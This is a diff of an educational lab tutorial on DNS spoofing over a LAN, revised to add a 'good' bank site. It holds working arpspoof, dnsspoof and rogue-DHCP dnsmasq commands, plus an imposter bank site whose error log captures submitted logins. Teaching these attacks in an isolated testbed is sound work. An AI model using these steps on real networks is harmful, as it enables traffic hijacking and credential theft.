@@ -51,9 +51,9 @@ Finally, we see how this attack can be used to transparently capture a user's lo
 
 ## Run my experiment
 
-First, reserve your resources. This experiment involves resources on two separate InstaGENI sites, which you will reserve using [two different RSpecs](https://gist.github.com/ffund/5751e9bb35dd93a4531e70947fefc5d3). (Note: you will need one publicly routable IP on each InstaGENI site. If you are having trouble getting resources, you may use [this monitoring page](https://genimon.uky.edu/status) to find sites with publicly routable IPs available.)
+First, reserve your resources. This experiment involves resources on *three* separate InstaGENI sites, which you will reserve using [two different RSpecs](https://gist.github.com/ffund/5751e9bb35dd93a4531e70947fefc5d3). (Note: you will need one publicly routable IP on each InstaGENI site. If you are having trouble getting resources, you may use [this monitoring page](https://fedmon.fed4fire.eu/overview/instageni) to find sites with publicly routable IPs available.)
 
-In the GENI Portal, create a new slice, then click "Add Resources". Load the RSpec from the URL: [https://git.io/fhpCT](https://git.io/fhpCT)
+In the GENI Portal, create a new slice, then click "Add Resources". Load the RSpec from the URL: [https://git.io/J3IWO](https://git.io/J3IWO)
 
 This should load a topology onto your canvas, with a client, a "good" network gateway implementing DHCP and DNS services, and a malicious attacker on the same LAN. The RSpec also includes commands to install the necessary software (e.g. `dnsmasq` for DNS and DHCP service, an Apache web server, the `dsniff` package for ARP and DNS spoofing, etc.) on the nodes. Click on "Site 1" and choose an InstaGENI site to bind to, then reserve your resources. 
 
@@ -61,9 +61,15 @@ Then, you will reserve a node on another InstaGENI site that will be the "malici
 
 Click on "Site 1" and  choose a _different_ InstaGENI site to bind to, then reserve your resources.
 
-Wait for your nodes to boot up (they will turn green in the canvas display on your slice page in the GENI portal when they are ready). Your complete topology should look like this:
+Then, you will reserve a node on another InstaGENI site that will be the "good" banking website. In the same slice, click "Add Resources", and load the RSpec from the URL: [https://git.io/vShxD](https://git.io/vShxD)
 
-![](/blog/content/images/2017/04/dnsspoof-topology.png)
+Click on "Site 1" and  choose a third, _different_ InstaGENI site to bind to, then reserve your resources.
+
+Your complete topology should look like this (but with InstaGENI site names instead of "Site 1", etc.):
+
+![](/blog/content/images/2021/03/topology-dnsspoof.png)
+
+Wait for your nodes to boot up (they will turn green in the canvas display on your slice page in the GENI portal when they are ready). 
 
 Then, wait another couple of minutes for the software installation to finish. Finally, use SSH to log in to each node in your topology (using the login details given in the GENI Portal).
 
@@ -71,32 +77,30 @@ Then, wait another couple of minutes for the software installation to finish. Fi
 
 Your "bank" node has been set up with a publicly routable IP address, so that sites hosted on it can be reached from anywhere on the Internet. It will also have a basic web server stack installed on it already.
 
-To set it up, you will download the content of a banking website onto your new web server. You can choose between [Diamond Bank](http://diamondbanking.com) of Arkansas _or_ [Bank of Hamilton](http://bankofhamilton.com), North Dakota. (Choose only _one_ of the two sites.) Why these sites? Both of these sites are vulnerable to impersonation because they do not use [HTTPS](https://en.wikipedia.org/wiki/HTTPS) (HTTP with an SSL or TLS layer). With HTTPS, the server would have a certificate that is signed by a [Certificate Authority](https://en.wikipedia.org/wiki/Certificate_authority) (CA) that authenticates it, i.e. confirms that the site _is_ who it claims to be.
+To set it up, you will download the content of a banking website onto your new web server. You can choose between [Diamond Bank](http://diamondbanking.com) of Arkansas _or_ [Bank of Hamilton](http://bankofhamilton.com), North Dakota. (Choose only _one_ of the two sites.) Why these sites? Both of these sites have been vulnerable to impersonation because their home page does not use [HTTPS](https://en.wikipedia.org/wiki/HTTPS) (HTTP with an SSL or TLS layer). With HTTPS, the server would have a certificate that is signed by a [Certificate Authority](https://en.wikipedia.org/wiki/Certificate_authority) (CA) that authenticates it, i.e. confirms that the site _is_ who it claims to be.
 
-_(Editor's note: After this experiment was written in July 2016, these two banking sites began using HTTPS. The screenshots below show what the sites looked like in 2016.)_
+> **Editor's note**: After this experiment was written in July 2016, these two banking sites began using HTTPS 🎉. The screenshots below show what the sites looked like in 2016.
 
 [Modern browsers](https://arstechnica.com/information-technology/2017/01/firefox-chrome-start-calling-http-connections-insecure/) usually identify sites that accept login details on an HTTP page in the address bar, e.g. Chrome shows these sites as "Not Secure":
 
 ![](/blog/content/images/2017/04/vulnerable-sites.png)
 
-These two banks put the form in which users enter their username and password on a page delivered by HTTP. When the user clicks "Login", the form is submitted to a location protected by HTTPS. In practice, this offers little security - pages delivered by HTTP can be compromised, so an attacker can submit the password data to a destination of their choosing, instead of (or in addition to) the intended HTTPS location. That's exactly what we'll do in this experiment.
 
+These two banks put the form in which users enter their username and password on a page delivered by HTTP. When the user clicks "Login", the form is submitted to a page that *is* protected by HTTPS, so the username and password should be encrypted before it is sent over the link. In practice, this offers little security - the home page with the login form, which was delivered by HTTP can be compromised, so an attacker can submit the password data to a destination of their choosing, instead of (or in addition to) the intended HTTPS location. That's exactly what we'll do in this experiment.
 
 To use the Diamond Bank site for your experiment, run
 
-```
+<pre>
 wget https://bitbucket.org/ffund/run-my-experiment-on-geni-blog/raw/master/files/diamondbanking.tgz
-# Note that the command above is all one line!
 sudo tar -xvzf diamondbanking.tgz -C /var/www/html/
-```
+</pre>
 
 on the "bank" node. Alternatively, to use Bank of Hamilton, run
 
-```
+<pre>
 wget https://bitbucket.org/ffund/run-my-experiment-on-geni-blog/raw/master/files/bankofhamilton.tgz
-# Note that the command above is all one line!
 sudo tar -xvzf bankofhamilton.tgz -C /var/www/html/
-```
+</pre>
 
 on the "bank" node.
 
@@ -116,6 +120,51 @@ wget -qO- https://ipinfo.io/ip
 ```
 
 Make a note of this IP address - you will need it later.
+
+To see your "fake" website, you can put the IP address in the address bar of your browser, and hit Enter. You should see a home page similar to the one shown above, but with a "FAKE" stamp across the logo.
+
+### Set up the "good" website
+
+On the second "bank" node in your experiment topology, set up a "good" copy of the website. This is meant to represent the actual bank site, *not* the imposter site controlled by the attacker.
+
+To use the Diamond Bank site for your experiment, run
+
+<pre>
+wget https://bitbucket.org/ffund/run-my-experiment-on-geni-blog/raw/master/files/diamondbanking.tgz
+sudo tar -xvzf diamondbanking.tgz -C /var/www/html/
+</pre>
+
+on the "bank" node. Then, run
+
+
+<pre>
+sudo wget https://witestlab.poly.edu/blog/content/images/2021/03/true-diamond-logo.png -O /var/www/html/assets/images/layout/logo.png
+</pre>
+
+Alternatively, to use Bank of Hamilton, run
+
+<pre>
+wget https://bitbucket.org/ffund/run-my-experiment-on-geni-blog/raw/master/files/bankofhamilton.tgz
+sudo tar -xvzf bankofhamilton.tgz -C /var/www/html/
+</pre>
+
+on the "bank" node. Then, run
+
+<pre>
+sudo wget https://witestlab.poly.edu/blog/content/images/2021/03/true-boh-logo.jpg -O /var/www/html/images/bannerbkg_img.jpg
+</pre>
+
+
+Finally, find out the public IP address of this node with
+
+```
+wget -qO- https://ipinfo.io/ip
+```
+
+Make a note of this IP address - you will need it later.
+
+
+To see your "good" website, you can put the IP address in the address bar of your browser, and hit Enter. You should see a home page *without* a "FAKE" stamp across the logo.
 
 ### Open a browser on the client
 
@@ -156,12 +205,8 @@ and then
 
 <pre>
 cd noVNC/
-./utils/launch.sh --vnc <b>client.dnsspoof.ch-geni-net.instageni.maxgigapop.net</b>:5900
+./utils/novnc_proxy --vnc $(hostname -f):5900
 </pre>
-
-where in place of the bold part above, you use the hostname shown for the "client" node in the GENI Portal:
-
-![](/blog/content/images/2017/04/dnsspoof-client-hostname.png)
 
 After some more lines of output, you should see a URL, e.g.:
 
@@ -172,7 +217,12 @@ Navigate to this URL:
 
 ```
 
-Open this URL in a browser. (A recent version of Google Chrome is recommended.)  Enter a password when prompted. Then, at the terminal, run
+Open this URL in a browser. (A recent version of Google Chrome is recommended.)  
+
+> **Note**: Some InstaGENI racks have a firewall in place that will block incoming traffic on the noVNC port. If everything looks normal in the terminal output but you haven't been able to open the URL in a browser, you might want to try using a different InstaGENI rack. You don't have to delete your existing resources, or set up the bank websites again! Just click "Add Resources" on your slice, add reserve the topology from [https://git.io/fhpCT](https://git.io/fhpCT) - with the "good" gateway, attacker, and target - on a *different* InstaGENI site that you haven't used yet. 
+
+
+Click "Connect", and enter a password when prompted. Then, at the terminal, run
 
 ```
 firefox -private
@@ -184,15 +234,18 @@ and a browser window in Private Browsing mode should come up:
 
 This browser is running on the "client" node, _not_ on your own laptop. (We are using Private Browsing mode so that nothing will be cached between experiments.)
 
-> **Note**: Some InstaGENI racks have a firewall in place that will block incoming traffic on the noVNC port. If everything looks normal in the terminal output but you haven't been able to open the URL in a browser, you might want to try using a different InstaGENI rack.
 
-**Disable DNS over HTTPS**: In 2020, Mozilla and Google both plan to roll out [DNS over HTTPS](https://developers.cloudflare.com/1.1.1.1/dns-over-https/) by default in Firefox and Chrome respectively. If DoH is enabled, Firefox won't use the DNS resolver configured by the OS - it will use the DoH-supporting resolver configured in Firefox settings. To run this experiment, make sure DoH is *not* enabled in your Firefox browser. Use the "X" in the Firefox tab to close it, then in your noVNC terminal, run
+**Disable DNS over HTTPS**: In 2020, Mozilla and Google both began to roll out [DNS over HTTPS](https://developers.cloudflare.com/1.1.1.1/dns-over-https/) by default in Firefox and Chrome respectively. If DoH is enabled, Firefox won't use the DNS resolver configured by the OS - it will use the DoH-supporting resolver configured in Firefox settings. To run this experiment, make sure DoH is *not* enabled in your Firefox browser, as follows.
+
+Use the "X" in the Firefox tab to close it, then in your noVNC terminal, run
 
 ```
 firefox -preferences
 ```
 
-In the "General" section, scroll all the way down until you reach "Network Settings", then click "Settings".  Scroll down again and make sure the box for "Enable DNS over HTTPS" is _not_ checked. Then press "OK". Close your Firefox tab and open a new session with
+In the "General" section, scroll all the way down until you reach "Network Settings", then click "Settings".  Scroll down again and make sure the box for "Enable DNS over HTTPS" is _not_ checked. Then press "OK". 
+
+Close your Firefox tab and open a new session with
 
 ```
 firefox -private
@@ -203,50 +256,52 @@ firefox -private
 
 First, we will show when happens when our client connects to a "good" DHCP+DNS server, and then tries to reach an external website. Open three terminal windows. On one, log in to the "client" node; on the other two, log in to the "good DNS/DHCP" server node.
 
-In each terminal window, use
-
-```
-sudo su
-```
-
-to become the "root" user.
-
-On one of the server terminals, run
+On one of the "good" DNS/DHCP server terminals, run
 
 <pre>
-service dnsmasq stop
-dnsmasq --interface=eth1 --dhcp-range=10.10.1.20,10.10.1.50,255.255.255.0,72h --dhcp-option=6,10.10.1.2 --no-hosts --bind-interfaces -d
+echo <b>"66.55.106.88 bankofhamilton.com"</b> > /tmp/hosts
 </pre>
 
-This sets up the `dnsmasq` server to act as a DHCP server, offering IP addresses in the range 10.10.1.20-10.10.1.50 to clients on the private LAN. It will also respond to DNS queries.
+but in place of the IP address above, substitute the IP address of the "good" website. (Also, if using Diamond Banking, substitute the hostname diamondbanking.com as well.)
+
+Then, run
+
+<pre>
+sudo service dnsmasq stop
+sudo dnsmasq --interface=eth1 --dhcp-range=10.10.1.20,10.10.1.50,255.255.255.0,72h --dhcp-option=6,10.10.1.2 --no-hosts --bind-interfaces --addn-hosts=/tmp/hosts -d
+</pre>
+
+This sets up the `dnsmasq` server to act as a DHCP server, offering IP addresses in the range 10.10.1.20-10.10.1.50 to clients on the private LAN. It will also respond to DNS queries, and it will use the IP and hostname mappings in the `/tmp/hosts` file you created a moment ago to respond to those queries.
 
 
-In the second server terminal window, run
+In the second terminal window on the "good" DNS/DHCP server, run
 
 ```
-tcpdump -n -i eth1 "ip"
+sudo tcpdump -n -i eth1 "ip"
 ```
 
-to monitor IP traffic to and from the "good" server on the private LAN.
+to monitor IP traffic to and from the "good" DNS/DHCP server on the private LAN.
 
-Then, on the client node, clear the current IP address and name resolution server information (it will be using a DNS server on the GENI rack, not on our private experiment LAN):
+By default, the client node uses a DNS server from the GENI host site, rather than the one on our private experiment LAN. Clear this configuration by running the following on the client node:
 
 ```
 # kill  running dhclient processes, if any
-killall dhclient
+sudo killall dhclient
 # release current IP address, if any
-dhclient -r eth1
+sudo dhclient -r eth1
 
 # clear DNS resolution info
-resolvconf -d eth0.dhclient
+sudo resolvconf -d eth0.dhclient
 ```
+
+(Note: the lines that begin with a `#` are comments - you don't have to run them, but if you do, they won't do anything!)
 
 
 Then, on the client node, run
 
 ```
 # request IP address
-dhclient eth1
+sudo dhclient eth1
 ```
 
 to request an IP address from DHCP over the private LAN. 
@@ -259,6 +314,7 @@ dnsmasq-dhcp: DHCPOFFER(eth1) 10.10.1.37 02:0f:07:a6:c6:d8
 dnsmasq-dhcp: DHCPREQUEST(eth1) 10.10.1.37 02:0f:07:a6:c6:d8 
 dnsmasq-dhcp: DHCPACK(eth1) 10.10.1.37 02:0f:07:a6:c6:d8 client
 ```
+
 and
 
 ```
@@ -268,7 +324,7 @@ and
 14:10:11.240854 IP 10.10.1.2.67 > 10.10.1.37.68: BOOTP/DHCP, Reply, length 300
 ```
 
-Note that the DHCP request is not directed at any particular server; it is sent to the broadcast address. This is what will enable our attacker to hijack DHCP on the LAN in later steps of our experiment!
+Note that the DHCP request is not directed at any particular server; it is sent to the broadcast address. The client node does not know in advance about the "good" DNS/DHCP server - it is willing to accept a DHCP response from any server on the LAN that replies to its broadcast message. This is what will enable our attacker to hijack DHCP on the LAN in later steps of our experiment!
 
 Now, we'll verify that the client is using our "good" server for name resolution. First, we'll test using the `nslookup` name resolution tool. On the client, run:
 
@@ -276,7 +332,9 @@ Now, we'll verify that the client is using our "good" server for name resolution
 nslookup bankofhamilton.com
 ```
 
-You should see the _real_ IP address of the website in the response:
+(or, substitute diamondbanking.com if that's what you're using.)
+
+You should see the IP address of the "good" website in the response:
 
 ```
 nslookup bankofhamilton.com  
@@ -295,44 +353,44 @@ In the `tcpdump` output on the server, you should also see the DNS query and res
 14:10:20.931615 IP 10.10.1.2.53 > 10.10.1.21.56094: 28276 1/4/4 A 66.55.106.88 (198)
 ```
 
-Finally, we'll visit `bankofhamilton.com` using the browser window that is running _on our client_, and verify that name lookup again. Again, you should see the name lookup in the `tcpdump` output on the server. (You may also see lookups for additional assets - images and scripts - that are hosted on other domains.)
+Finally, we'll visit `bankofhamilton.com` (or: `diamondbanking.com`) using the browser window that is running _on our client_, and verify that name lookup again. Again, you should see the name lookup in the `tcpdump` output on the server. (You may also see lookups for additional assets - images and scripts - that are hosted on other domains.)
 
 <iframe width="560" height="315" src="https://www.youtube.com/embed/dMIDt59_-N0" frameborder="0" allowfullscreen></iframe>
 
+### DNS spoofing attacks
 
 Now, we will try two methods for DNS spoofing on a LAN:
 
 1. The attacker uses ARP spoofing to impersonate the "good" DNS server, and responds to DNS queries for the targeted website before the "good" DNS server does. 
 2. The attacker uses a DHCP masquerade attack to impersonate the "good" DHCP server, and tells the victim to use the attacker as a nameserver. Then it serves its own address in response to DNS queries for the targeted website.
 
-Open another two terminal windows, and in both, log in to your "attacker" node. Use 
+Both attacks take advantage of the fact that basic network protocols like ARP and DHCP use no security measures - an attacker with access to the target's LAN can send ARP or DHCP responses that appear equally as valid as the "true" ARP and DHCP responses.
 
-```
-sudo su
-```
+These attacks work most reliably when packets from the attacker reach the client _before_ packets from the "good" server. To ensure this happens in our experiment, we will set up some extra latency on the "good" DNS/DHCP server. 
 
-to become the "root" user on these as well.
+Stop the `tcpdump` process on the "good" DNS/DHCP server, and run
+
+<pre>
+sudo tc qdisc del dev eth1 root 
+# don't worry if this command returns 
+# 'RTNETLINK answers: No such file or directory'
+sudo tc qdisc add dev eth1 root netem delay 500ms 2ms distribution normal
+</pre>
+
+on it. 
 
 ### ARP spoofing
 
-This attack works most reliably when packets from the attacker reach the client _before_ packets from the "good" server. To ensure this happens in our experiment, we will set up some extra latency on the "good" server. Stop the `tcpdump` process on the "good" server temporarily, and run
+(This procedure assumes that you have just completed the steps in the previous sections, so that the client is already configured to use the "good" server for both DHCP and DNS lookups, and that the `dnsmasq` process is currently running on the "good" server. If you haven't gone through those steps yet, do them now.)
 
-<pre>
-tc qdisc del dev eth1 root 
-# don't worry if this command returns 
-# 'RTNETLINK answers: No such file or directory'
-tc qdisc add dev eth1 root netem delay 500ms 2ms distribution normal
-</pre>
-
-on it.  Then restart the `tcpdump` with 
+On the attacker, start a `tcpdump` with 
 
 ```
-tcpdump -i eth1 -n -e "udp port 53"
+sudo tcpdump -i eth1 -n -e "arp or udp port 53"
 ```
 
-Here, we specifically look at DNS traffic (using UDP port 53), and we also look at the Ethernet headers.
+Here, we specifically look at ARP and DNS traffic (using UDP port 53), and we also look at the Ethernet headers.
 
-(This procedure assumes that you have just completed the steps above, so that the client uses the "good" server for both DHCP and DNS lookups, and that the `dnsmasq` process is currently running on the "good" server. If you haven't gone through those steps yet, do them now.)
 
 
 Check the client's ARP table to see what MAC address is currently associated with the server's IP address:
@@ -347,19 +405,36 @@ You should see the "good" server's actual MAC address, e.g. in my experiment:
 dns-good-link-0 (10.10.1.2) at 02:b7:c8:cf:b7:ce [ether] on eth1
 ```
 
-Next, we are going to use ARP spoofing to make the client believe we are the "good" server, and the server believe we are the client. On the attacker, run:
+Next, we are going to use ARP spoofing to make the client associate the attacker's MAC address with the IP address of the "good" server, and make the server associate the attacker's MAC address with the IP address of the client. We'll need four terminal windows on the attacker.
+
+On the attacker, run:
 
 
 ```
 # Enable packet forwarding
-sysctl -w net.ipv4.ip_forward=1
+sudo sysctl -w net.ipv4.ip_forward=1
+```
+
+In one terminal on the attacker node, run
+
+```
 # get IP address of client from the "good" server
 clientip=$(dig @10.10.1.2 +short client)
-# ARP spoofing: make client think we are
-# the "good" server, and vice versa
-arpspoof -i eth1 -t 10.10.1.2 "$clientip" &
-arpspoof -i eth1 -t "$clientip" 10.10.1.2 &
+# ARP spoofing in one direction
+sudo arpspoof -i eth1 -t 10.10.1.2 "$clientip"
 ```
+
+and leave this running. In a second terminal on the attacker node, run
+
+```
+# get IP address of client from the "good" server
+clientip=$(dig @10.10.1.2 +short client)
+# ARP spoofing in reverse direction
+sudo arpspoof -i eth1 -t "$clientip" 10.10.1.2
+```
+
+and leave this running.
+
 
 In the terminal output, you can see that the attacker sends ARPs to the client impersonating the "good" DNS server (which is at 10.10.1.2), and also sends ARPs to the "good" server impersonating the client:
 
@@ -374,21 +449,20 @@ On the client node, check the ARP table again with
 arp -a -i eth1
 ```
 
-You should see that what the client now believes that the "good" server's MAC address is actually the attackers' MAC address!
+You should see that what the client now believes that the "good" DNS/DHCP server's MAC address, is actually the attackers' MAC address!
 
 ```
 dns-good-link-0 (10.10.1.2) at 02:60:70:39:bf:e2 [ether] on eth1
 ```
 
-Finally, we're ready to offer up some bad name resolution. In a second terminal on the attacker, run
+Finally, we're ready to offer up some bad name resolution. In a fourth terminal on the attacker, run
 
 <pre>
 echo "<b>66.104.96.102</b> bankofhamilton.com" > /tmp/badhosts
-
-dnsspoof -i eth1 -f /tmp/badhosts
+sudo dnsspoof -i eth1 -f /tmp/badhosts
 </pre>
 
-substituting for the part in bold the public IP address for the "bank" node that you found in a [previous step](#setupthefakewebsite).
+substituting for the part in bold the public IP address for the "fake" bank node that you found in a [previous step](#setupthefakewebsite) (and substitute: diamondbanking.com if using Diamond Bank).
 
 This command creates a file called `badhosts` with a list of IP address and hostname mappings that we will fool our client into believing. In this case, our attacker will make the client go to our imposter site when he tries to visit Bank of Hamilton. Then we use the `dnsspoof` tool to answer DNS queries for those hosts.
 
@@ -399,6 +473,7 @@ On the client, run
 nslookup bankofhamilton.com
 ```
 
+(substitute: diamondbanking.com if using Diamond Bank).
 
 Check the IP address returned from `nslookup`  - is it the same one as before? 
 
@@ -411,15 +486,15 @@ Name:	bankofhamilton.com
 Address: <b>66.104.96.102</b>
 </pre>
 
-Also note that the client _believes_ it has received a response from the "good" server (at 10.10.1.2), even though this actually came from the attacker.
+Also note that the client _believes_ it has received a response from the "good" DNS/DHCP server (at 10.10.1.2), even though this actually came from the attacker.
 
-In the `tcpdump` output on the "good" server, you should still see the DNS query and response. First, we see that the client (02:0f:07:a6:c6:d8 in this example) sends a DNS query for bankofhamilton.com to the address of the good server, 10.10.1.2, but using the attacker's MAC address (02:60:70:39:bf:e2) as the destination:
+In the `tcpdump` output, you should see the DNS query and response. First, we see that the client (02:0f:07:a6:c6:d8 in this example) sends a DNS query for bankofhamilton.com to the IP address of the good server, 10.10.1.2, but using the attacker's MAC address (02:60:70:39:bf:e2) as the destination:
 
 ```
 15:01:22.684782 02:0f:07:a6:c6:d8 > 02:60:70:39:bf:e2, ethertype IPv4 (0x0800), length 78: 10.10.1.37.36285 > 10.10.1.2.53: 36777+ A? bankofhamilton.com. (36)
 ```
 
-The attacker sends a query to the "good" server (on 02:b7:c8:cf:b7:ce in this example) pretending to be the client at 10.10.1.37, and finds out the actual IP address associated with that hostname. (In the event that the hostname requested  by the client is not on the list of IP addresses it will "spoof", it still needs to return an address - which it will learn from this legitimate DNS lookup.)
+The attacker then sends a query to the "good" DNS server (on 02:b7:c8:cf:b7:ce in this example) pretending to be the client at 10.10.1.37, and finds out the actual IP address associated with that hostname. (In the event that the hostname requested  by the client is not on the list of IP addresses it will "spoof", it still needs to return an address - which it will learn from this legitimate DNS lookup.)
 
 ```
 15:01:22.684815 02:60:70:39:bf:e2 > 02:b7:c8:cf:b7:ce, ethertype IPv4 (0x0800), length 78: 10.10.1.37.36285 > 10.10.1.2.53: 36777+ A? bankofhamilton.com. (36)
@@ -447,68 +522,54 @@ Finally, we'll visit `bankofhamilton.com` in the Firefox browser instance that i
 firefox -private
 ```
 
-again to open a fresh browser session. Type `bankofhamilton.com` in the address bar, and hit Enter. Which version of the site do you see, the real one or the imposter? We have modified the logo of the imposter site with a big "FAKE" warning so that we can tell which site we are visiting.
+again to open a fresh browser session. Type `bankofhamilton.com` in the address bar, and hit Enter. (Substitute: diamondbanking.com if using Diamond Bank.) Which version of the site do you see, the real one or the imposter? We have modified the logo of the imposter site with a big "FAKE" warning so that we can tell which site we are visiting.
 
 <iframe width="560" height="315" src="https://www.youtube.com/embed/U6-DSK3PfvI" frameborder="0" allowfullscreen></iframe>
 
-When you've verified the attack, use Ctrl+C to stop the `dnsspoof` process, and stop the ARP spoofing by running
-
-```
-killall arpspoof
-```
-
-on the attacker.
+When you've verified the attack, use Ctrl+C to stop the `dnsspoof` process and the `arpspoof` processes.
 
 ### DHCP masquerade attack
 
-In this version of the attack, the attacker will run its own DHCP server. When the client requests a new address from DHCP, it will get an offer from the attacker before the "good" server (because of the latency we will set up on the "good" server). As part of the DHCP response, the attacker will tell the client to use it for name resolution. Then, it can send malicious DNS responses.
+In this version of the attack, the attacker will run its own DHCP server. When the client requests a new address from DHCP, it will get an offer from the attacker before the "good" DNS/DHCP server (because of the latency we will set up on the "good" DNS/DHCP server). As part of the DHCP response, the attacker will tell the client to use it for name resolution. Then, it can send malicious DNS responses.
 
 This procedure assumes that you have already run the previous attack, and so you already have the `/tmp/badhosts` file set up to map the Bank of Hamilton to the IP address of your own imposter site. If you _don't_ have this, repeat the relevant steps in the previous section.
 
-This attack works most reliably when packets from the attacker reaching the client _before_ packets from the "good" server. To ensure this happens in our experiment, we will set up some extra latency on the "good" server. Stop the `tcpdump` process on the "good" server temporarily, and run
-
-```
-tc qdisc del dev eth1 root
-tc qdisc add dev eth1 root netem delay 500ms 2ms distribution normal
-```
-
-and then you can start the `tcpdump` again. We will use a filter to focus on DHCP traffic:
-
-```
-tcpdump -i eth1 -n -e -v "udp port 67 or udp port 68"
-```
-
 Also, the `dnsmasq` process should still be running on the "good" server.
+
+Clear the existing DHCP and DNS settings on the client node:
+
+
+```
+# kill  running dhclient processes, if any
+sudo killall dhclient  
+# release current IP address, if any
+sudo dhclient -r eth1
+
+# clear DNS resolution info
+sudo resolvconf -d eth0.dhclient  
+```
+
 
 Now, on the attacker, start a `dnsmasq` instance:
 
 <pre>
-service dnsmasq stop
-dnsmasq --interface=eth1 --bind-interfaces --dhcp-range=10.10.1.20,10.10.1.50,255.255.255.0,72h --no-hosts --dhcp-option=6,10.10.1.254 --addn-hosts=/tmp/badhosts -d
+sudo service dnsmasq stop
+sudo dnsmasq --interface=eth1 --bind-interfaces --dhcp-range=10.10.1.20,10.10.1.50,255.255.255.0,72h --no-hosts --dhcp-option=6,10.10.1.254 --addn-hosts=/tmp/badhosts -d
 </pre>
 
-Note the `addn-hosts` option we are using, to tell `dnsmasq` to respond to queries for hostnames listed in the `badhosts` file with the corresponding addresses listed there. Also on the attacker, start a `tcpdump` to show DHCP traffic:
+Note the `addn-hosts` option we are using, to tell `dnsmasq` to respond to queries for hostnames listed in the `badhosts` file with the corresponding addresses listed there. 
+
+
+On the client node, start a `tcpdump` to show DHCP and DNS traffic:
+
+<pre>
+sudo tcpdump -i eth1 -n -e -v "udp port 67 or udp port 68 or udp port 53"
+</pre>
+
+Then, in a second terminal window on the client, run
 
 ```
-tcpdump -i eth1 -n -e -v "udp port 67 or udp port 68"
-```
-
-Now, on the client node, run
-
-```
-# kill  running dhclient processes, if any
-killall dhclient  
-# release current IP address, if any
-dhclient -r eth1
-
-# clear DNS resolution info
-resolvconf -d eth0.dhclient  
-```
-
-and
-
-```
-dhclient eth1  
+sudo dhclient eth1  
 ```
 
 to ask for an IP address from DHCP over the private LAN. In the `tcpdump` output, we can see the client's DISCOVER message, which is broadcast on the LAN:
@@ -609,13 +670,7 @@ cat /etc/resolv.conf
 
 to check which host it is using for name resolution. Is it the "good" server (10.10.1.2) or the attacker (10.10.1.254)?
 
-On both the attacker and the good server, stop the currently running `tcpdump` and start a new one to focus on DNS traffic:
-
-```
-tcpdump -i eth1 -n "udp port 53"
-```
-
-Then, try resolving bankofhamilton.com on the client with 
+Try resolving bankofhamilton.com (or diamondbanking.com, if that's what you are using) on the client: 
 
 ```
 nslookup bankofhamilton.com
@@ -652,7 +707,7 @@ This attack is not deterministic - if the "good" server's DHCP offer reaches the
 
 ### Capture login credentials
 
-Finally, we will see how the login credentials may be captured (transparently) by the attacker. On the "bank" node, run
+Finally, we will see how the login credentials may be captured (transparently) by the attacker. On the "fake" bank node, run
 
 ```
 sudo tail -f /var/log/apache2/error.log
@@ -662,7 +717,7 @@ to watch the web server error log. We have set up our site to log all captured c
 
 In the Firefox window that is running on the "client" node, attempt to log in to the Bank of Hamilton imposter site (with any username and password; it won't work, of course).
 
-Then, return to the "bank" terminal window. You should observe that the username and password you entered are recorded in the log file:
+Then, return to the "fake" bank terminal window. You should observe that the username and password you entered are recorded in the log file:
 
 ```
 [Wed Apr 19 20:10:14.063738 2017] [:error] [pid 11334] [client 206.196.180.223:37462] CAPTURED LOGIN: test and testpassword from 206.196.180.223, referer: http://bankofhamilton.com/
